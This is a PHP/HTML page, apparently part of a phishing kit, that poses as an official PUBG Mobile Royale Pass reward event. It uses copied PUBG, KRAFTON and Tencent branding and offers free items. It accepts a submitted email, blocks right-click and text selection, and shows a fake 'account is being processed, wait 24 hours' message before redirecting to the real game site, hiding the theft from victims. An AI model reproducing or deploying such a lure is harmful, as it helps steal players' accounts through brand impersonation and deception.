<?php
// MENGAMBIL KONTROL
include 'system/setting.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="PUBGM ROYALE PASS EVENT">
    <meta name="description" content="Collect your special rewards at the PUBGM ROYALE PASS EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:description" content="Collect your special rewards at the PUBGM ROYALE PASS EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="PUBGM ROYALE PASS EVENT">
    <meta property="og:type" content="website">
    <meta name="copyright" content="PUBG MOBILE">
    <meta name="theme-color" content="#000">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
    <title>PUBGM ROYALE PASS EVENT</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/log/tanfc.css">
    <link rel="stylesheet" href="css/log/tantw.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="">
    <style type="text/css">
        @charset "utf-8";
        @import url(https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500);

        @font-face {
            font-family: 'pubgFont';
            font-style: normal;
            font-weight: 700;
            src: url(fonts/pubg.woff2) format("woff2"), url(fonts/pubg.woff) format("woff"), url(fonts/pubg.ttf) format("truetype")
        }

        *,
        *:before,
        *:after {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        body {
            background: #000;
            margin: 0;
            font-family: 'Teko'
        }

        .container {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/bg.jpg) no-repeat center center;
            background-size: 100% 100%;
            position: relative;
            margin: 0 auto;
            max-width: 400px;
            height: auto;
            border: 0 solid #ebca92
        }

        .slideshow-container {
            max-width: 1000px;
            position: relative;
            margin: auto;
            border-top: 1px solid #ebca92;
            border-bottom: 2px solid #ebca92
        }

        .fade {
            -webkit-animation-name: fade;
            -webkit-animation-duration: 1.5s;
            animation-name: fade;
            animation-duration: 1.5s
        }

        .navbar {
            background: #000;
            width: 100%;
            height: 50px;
            padding: 4px
        }

        .navbar img {
            width: 41;
            margin-right: 5px;
            border-radius: 5px;
            float: left
        }

        .navbar-txt-game {
            padding-top: 2px;
            color: #feab02;
            font-size: 18px;
            font-family: 'Teko', sans-serif;
            text-align: left
        }

        .navbar-txt-game span {
            color: #d9d9d8;
            font-size: 13px;
            line-height: 10px;
            display: block
        }

        .navbar-btn-wrapper {
            margin-top: 5px;
            float: right
        }

        .navbar-btn-wrapper i {
            margin-left: 5px;
            font-size: 38px;
            color: #d9d9d8;
            line-height: 31px;
            float: right
        }

        .navbar-btn {
            background: #eaa300;
            width: 70px;
            height: auto;
            margin: 2px;
            padding: 2px;
            color: #000;
            font-size: 15px;
            font-family: 'Teko', sans-serif;
            text-align: center;
            text-transform: uppercase;
            border: 1px solid #ffcc57;
            display: inline-block;
            outline: none
        }

        .header {
            width: 100%;
            height: 200px;
            margin-left: auto;
            margin-right: auto;
            border-bottom: 2px solid #ebca92;
            display: block
        }

        .header img {
            width: 100%;
            height: 100%
        }

        .header video {
            width: 100%
        }

        .landing {
            width: 100%;
            height: auto
        }

        .season-img {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/alatselow/alert.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 55px;
            margin-top: 2px;
            margin-left: 9px;
            margin-right: auto;
            display: block
        }

        .season-alert {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/alatselow/alert2.png) no-repeat center center;
            box-shadow: #fffafa;
            background-size: 100% 100%;
            width: 94.3%;
            height: 28;
            margin-left: auto;
            margin-right: 5px;
            margin-bottom: -15px;
            padding-top: -1px;
            padding-bottom: 5px;
            display: block
        }

        .season-alert-title {
            color: #ebca92;
            font-size: 17px;
            font-family: pubgFont;
            font-weight: 500;
            text-align: center
        }

        .scroll {
            overflow: scroll;
            position: relative;
            width: 100%;
            height: 300px;
            margin-top: 11px;
            margin-left: auto;
            margin-right: auto;
            display: block;
            scrollbar-face-color: #ffbb40;
            scrollbar-shadow-color: #ffbb40;
            scrollbar-highlight-color: #ffbb40;
            scrollbar-3dlight-color: #ffbb40;
            scrollbar-darkshadow-color: #ffbb40;
            scrollbar-track-color: #ffbb40;
            scrollbar-arrow-color: #ffbb40
        }

        .slideshow-container {
            max-width: 1000px;
            position: relative;
            margin: auto
        }

        .fade {
            -webkit-animation-name: fade;
            -webkit-animation-duration: 1.5s;
            animation-name: fade;
            animation-duration: 1.5s
        }

        .item {
            width: 30%;
            height: 100px;
            margin: 3px;
            margin-bottom: 38px;
            display: inline-block
        }

        .item img {
            width: 100%;
            height: 100%
        }

        .item button {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/bg_cratebtn1.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: auto;
            padding: 3px;
            color: #000;
            font-size: 16px;
            font-family: pubgFont;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none
        }

        .item img {
            border-top: 1.5px solid #ebca92;
            border-left: 1px solid #ebca92;
            border-right: 1px solid #ebca92;
            border-bottom: none
        }

        .footer {
            background: #000;
            width: 100%;
            height: auto;
            padding: 10px
        }

        .footer-txt-follow {
            margin-top: 13px;
            margin-bottom: 5px;
            color: #7c7c7c;
            font-size: 14px;
            font-family: followFont;
            font-weight: bold;
            text-align: center;
            text-transform: uppercase
        }

        .footer-follow-icon {
            width: 49px;
            height: 49px;
            margin: 5px;
            display: inline-block
        }

        .footer-txt-copyright {
            color: #7c7c7c;
            font-size: 13px;
            font-family: textFont;
            text-align: center
        }

        .footer-copyright-icon {
            width: 74%;
            margin-top: 8px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 15px;
            display: block
        }

        .popup {
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999;
            background-color: rgba(0, 0, 0, .4)
        }

        .popup-box {
            width: 390px;
            height: auto;
            position: relative;
            margin: 50px auto;
            margin-top: 15%;
            text-align: center;
            font-family: 'Teko';
            color: #000
        }

        .nav-popup {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/popup-navbar.png) no-repeat center center;
            background-size: 100% 100%;
            height: auto;
            padding-top: 3px;
            padding-bottom: 3px
        }

        .nav-popup-title {
            margin-top: 5px;
            padding-left: 13px;
            color: #000;
            font-size: 21px;
            font-family: pubgFont;
            font-weight: 500;
            text-align: left
        }

        .popup-box-bg {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/popup-box-bg.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            margin-top: -10px
        }

        .popup-alert {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #fff;
            font-size: 20px;
            font-family: pubgFont;
            font-weight: 500;
            text-align: center;
            display: block
        }

        .popup-item {
            width: 23%;
            height: 85px;
            margin-left: auto;
            margin-right: auto;
            border: 1px solid #ebca92;
            display: block
        }

        .popup-footer {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/popup-footer.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 37px
        }

        .popup-footer button {
            width: auto;
            height: auto;
            margin-top: -5px;
            margin-bottom: 5px;
            padding: 10px;
            padding-left: 40px;
            padding-right: 40px;
            color: #151e2d;
            font-size: 18px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none
        }

        .popup-footer-deactive {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/btn-off.png) no-repeat center;
            background-size: 80% 90%;
            margin-left: 10%;
            float: left
        }

        .popup-footer-active {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/btn-on.png) no-repeat center;
            background-size: 80% 90%;
            margin-right: 10%;
            float: right
        }

        .popup-footer-center {
            background: url(https://raw.githubusercontent.com/jefanya14/pubg-claim-v64/main/btn-on.png) no-repeat center;
            background-size: 80% 90%;
            margin-top: -15px;
            margin-bottom: 5px;
            margin-left: auto;
            margin-right: auto;
            outline: none;
            display: block
        }

        .popup-btn-login {
            width: 90%;
            height: auto;
            padding: 8px;
            margin-left: auto;
            margin-right: auto;
            color: #000;
            font-size: 15px;
            font-family: Teko;
            border: none;
            outline: none;
            display: block
        }

        .popup-btn-login i {
            color: #fff;
            font-size: 20px;
            float: left
        }

        .popup-btn-facebook {
            background: #1778f2;
            color: #fff;
            margin-bottom: 3px
        }

        .popup-btn-twitter {
            background: #08a0e9;
            color: #fff
        }

        .popup-btn-login {
            width: 90%;
            height: auto;
            padding: 8px;
            margin-left: auto;
            margin-right: auto;
            color: #000;
            font-size: 15px;
            font-family: Teko;
            border: none;
            outline: none;
            display: block
        }

        .popup-btn-login i {
            color: #fff;
            font-size: 20px;
            float: left
        }

        .popup-btn-facebook {
            background: #1778f2;
            color: #fff;
            margin-bottom: 3px
        }

        .popup-btn-twitter {
            background: #08a0e9;
            color: #fff
        }

        .popup-login {
            background: rgba(0, 0, 0, .4);
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999
        }

        .popup-box-login-fb {
            background: #eceff6;
            max-width: 330px;
            height: auto;
            position: relative;
            margin: 50px auto;
            margin-top: 1.9%;
            text-align: center;
            font-family: 'Teko';
            color: #000;
            border-radius: 10px
        }

        .popup-box-login-twitter {
            background: #fff;
            max-width: 330px;
            height: 345px;
            position: relative;
            margin: 50px auto;
            margin-top: 10%;
            text-align: center;
            font-family: 'Teko';
            color: #000;
            border-radius: 10px
        }

        .close-fb {
            background: #000;
            width: 20px;
            height: 20px;
            color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 50%;
            border: 1.5px solid #fff;
            position: absolute;
            top: -8px;
            right: -10px;
            display: block
        }

        .close-fb i {
            color: #fff;
            padding-top: 1px
        }

        .close-other {
            background: #000;
            width: 20px;
            height: 20px;
            color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 50%;
            border: 1.5px solid #fff;
            top: -8px;
            right: -10px;
            position: absolute;
            z-index: 9999999;
            display: block
        }

        .close-other i {
            color: #fff;
            padding-top: 1px
        }

        .item div {
            width: 100%;
            height: 100%;
            border-radius: 3px 3px 0 0
        }

        .item div:first-child {
            margin-left: 0
        }

        figure {
            margin: 0;
            padding: 0;
            overflow: hidden
        }

        .selowbosque figure {
            position: relative
        }

        .selowbosque figure::before {
            position: absolute;
            top: 0;
            left: -75%;
            z-index: 2;
            display: block;
            content: '';
            width: 50%;
            height: 100%;
            background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
            background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
            -webkit-transform: skewX(-25deg);
            transform: skewX(-25deg)
        }

        .selowbosque figure::before {
            -webkit-animation: shine 2s infinite;
            animation: shine 2s infinite
        }

        @-webkit-keyframes shine {
            100% {
                left: 125%;
            }
        }

        @keyframes shine {
            100% {
                left: 125%;
            }
        }

        @media only screen and (max-width:600px) {
            .container {
                width: 100%;
                height: auto;
                margin-top: 0;
                margin-bottom: 0;
                border: none;
                border-top: 0 solid #57c0ff;
                border-radius: 0;
                padding: 0
            }

            .box {
                width: 96%;
                height: auto
            }

            .scroll {
                height: none
            }

            .item {
                height: 90px
            }

            .popup-box {
                width: 345px;
                margin-top: 60%
            }

            .popup-item {
                width: 25%;
                height: 85px
            }

            .popup-box-login-fb {
                margin-top: 4%
            }

            .popup-box-login-twitter {
                margin-top: 25%
            }

            .header {
                width: 100%
            }
        }
    </style>
    <div class="container rewardsBox">
        <div class="navbar">
            <div class="navbar-btn-wrapper">
                <button type="button" class="navbar-btn" onclick="location.href='https://www.pubgmobile.com/pay/';" onmousedown="buka.play();">Purchase</button>
                <button type="button" class="navbar-btn" onclick="location.href='https://play.google.com/store/apps/details?id=com.tencent.ig';" onmousedown="buka.play();">Download</button>
            </div>
            <!--- navbar-btn-wrapper --->
			<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
            <div class="navbar-txt-game">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </div>
            <!--- navbar-txt-game --->
        </div>
        <!--- navbar --->
        <div class="slideshow-container">
            <div class="mySlides fade" style="display: block;">
                <img src="https://i.ibb.co/TmZQdzQ/image-25.png" style="width:100%">
            </div>
            <div style="text-align:center">
                <span class="dot active"></span>
            </div>
        </div>
        <!--- header --->
        <div class="box">
            <div class="season-img">
            </div>
        </div>
        <div class="tab_rewards" id="latest">
            <center>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://raw.githubusercontent.com/genjehhh1/v30/main/1.jpg">
                        </figure>
                    </div>
                    <div>
                        <button src="https://raw.githubusercontent.com/genjehhh1/v30/main/1.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://raw.githubusercontent.com/genjehhh1/v30/main/2.jpg">
                        </figure>
                    </div>
                    <div>
                        <button src="https://raw.githubusercontent.com/genjehhh1/v30/main/2.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://i.ibb.co/V9GzKKw/image-35.png">
                        </figure>
                    </div>
                    <div>
                        <button src="https://i.ibb.co/V9GzKKw/image-35.png" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://raw.githubusercontent.com/genjehhh1/v30/main/4.jpg">
                        </figure>
                    </div>
                    <div>
                        <button src="https://raw.githubusercontent.com/genjehhh1/v30/main/4.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://raw.githubusercontent.com/genjehhh1/v30/main/5.jpg">
                        </figure>
                    </div>
                    <div>
                        <button src="https://raw.githubusercontent.com/genjehhh1/v30/main/5.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

                <div class="item selowbosque">
                    <div>
                        <figure>
                            <img src="https://raw.githubusercontent.com/genjehhh1/v30/main/6.jpg">
                        </figure>
                    </div>
                    <div>
                        <button src="https://raw.githubusercontent.com/genjehhh1/v30/main/6.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
                    </div>
                </div>

            </center>
        </div>
        <!--- scroll --->
		<div class="footer">
		<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
		<center>
		<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
		<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
		<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
		<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
		<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
		</center>
		<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
		<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
		<div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
		<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
		</div> <!--- footer --->
    </div>
    <!--- tab-rewards --->
    <!--- box --->
    <!--- container --->

    <div class="popup reward_confirmation">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="nav-popup-title">PROCESSING REWARD</div>
                <!--- nav-popup-title --->
            </div>
            <!--- nav-popup --->
            <div class="popup-box-bg">
                <div class="popup-alert">
                    Thank you for joining the Royale Pass Event
                    <br>
                    Your account is being processed
                    <br>
                    To receive your reward
                    <br>
                    Wait up to 24 hours.
                    <br>
                </div>
                <div class="popup-footer">
                    <button type="button" class="popup-footer-center" onmousedown="buka.play();" onclick="location.href='https://pubgmobile.com/';">Logout</button>
                </div>
                <!--- popup-footer --->
            </div>
            <!--- popup-box --->
        </div>
        <!--- reward_confirmation --->
    </div>

    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="js/tab.js"></script>
    <script src="js/showHide.js"></script>
    <script>
        var slideIndex = 0;
        showSlides();

        function showSlides() {
            var i;
            var slides = document.getElementsByClassName("mySlides");
            var dots = document.getElementsByClassName("dot");
            for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            slideIndex++;
            if (slideIndex > slides.length) {
                slideIndex = 1
            }
            for (i = 0; i < dots.length; i++) {
                dots[i].className = dots[i].className.replace(" active", "");
            }
            slides[slideIndex - 1].style.display = "block";
            dots[slideIndex - 1].className += " active";
            setTimeout(showSlides, 2500);
        }
    </script>
    <script>
        function open_reward_confirmation(ag) {
            var rewardImg = $(ag).attr("src");
            $('.reward_confirmation').show();
            $('#myRewardImg').attr('src', rewardImg);
        }

        function open_account_login() {
            $('.account_login').show();
            $('.reward_confirmation').hide();
        }

        function open_facebook() {
            $('.login-facebook').show();
            $('.account_login').hide();
        }

        function open_twitter() {
            $('.login-twitter').show();
            $('.account_login').hide();
        }

        function close_reward_confirmation() {
            $('.reward_confirmation').hide()
        }

        function close_account_login() {
            $('.account_login').hide()
        }

        function tutup_facebook() {
            $('.login-facebook').hide()
            $('.account_login').show();
        }

        function tutup_twitter() {
            $('.login-twitter').hide()
            $('.account_login').show();
        }

        function seseselow2() {
            $('.account_login').hide()
            $('.reward_confirmation').show()
        }
    </script>
    <script src="js/click.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            var detik = 59;
            var menit = 59;
            var jam = 23;

            function hitung() {
                setTimeout(hitung, 1000);
                $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
                detik--;
                if (detik < 0) {
                    detik = 59;
                    menit--;
                    if (menit < 0) {
                        menit = 0;
                        detik = 0;
                    }
                }
            }
            hitung();
        });
        $(document).ready(function() {
            var detik = 59;
            var menit = 59;
            var jam = 23;

            function hitung() {
                setTimeout(hitung, 1000);
                $('#seasonTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
                detik--;
                if (detik < 0) {
                    detik = 59;
                    menit--;
                    if (menit < 0) {
                        menit = 0;
                        detik = 0;
                    }
                }
            }
            hitung();
        });
    </script>
</body>
</html>